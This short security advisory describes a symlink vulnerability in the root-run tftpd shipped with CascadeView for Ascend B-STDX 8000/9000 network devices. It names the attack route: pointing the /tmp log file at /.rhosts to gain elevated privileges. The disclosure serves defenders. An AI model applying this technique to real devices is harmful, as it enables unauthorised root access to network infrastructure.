The tftpd bundled with CascadeView for Ascend's B-STDX 8000/9000 network devices creates a log in /tmp called tftpd_xfer_status.log. If /tmp/tftpd_xfer_status.log already exists as a symbolic link, tftpd will follow it and overwrite any data it points to (it runs as root). It is possible for an attacker to link the log file to a file like /.rhosts to compromise elevated privileges on the device. It should be made clear that since this is a network device vulnerability, the consequences of compromise could be much greater to the network the device is on as a whole than if it were a single regular host.
